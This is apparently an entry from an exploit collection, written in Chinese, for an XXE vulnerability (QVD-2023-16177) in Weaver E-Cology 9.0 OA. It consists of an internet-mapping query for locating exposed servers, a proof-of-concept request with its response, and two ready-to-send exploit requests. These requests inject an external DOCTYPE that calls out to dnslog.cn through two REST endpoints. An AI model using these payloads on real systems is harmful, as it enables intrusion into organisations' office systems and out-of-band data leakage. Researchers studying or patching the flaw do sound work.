# 泛微E-Cology XXE QVD-2023-16177

## 网络测绘

hunter: app.name="泛微 e-cology 9.0 OA"

## POC / EXP

```
# POC
Request:
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host: 127.0.0.1
Content-Type: application/xml

<M><syscode>&send;</syscode></M>

Response:
HTTP/1.1 200 OK
Server: WVS
Cache-Control: private
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
Set-Cookie: ecology_JSessionid=aaaQTyKN7FSeO4NM8wfLy; path=/
Content-Type: application/xml; charset=UTF-8
Content-Length: 177

<ResultInfo><syscode></syscode><operResult>0</operResult><dataType>OtherSys</dataType><operType>Check</operType><message>异构系统标识【】未注册</message></ResultInfo>
```

```
# EXP1

POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host: 127.0.0.1
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?><!DOCTYPE syscode SYSTEM "http://dnslog.cn"><M><syscode>&send;</syscode></M>
```

```
# EXP2

POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: 127.0.0.1
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?><!DOCTYPE syscode SYSTEM "http://dnslog.cn"><M><syscode>&send;</syscode></M>
```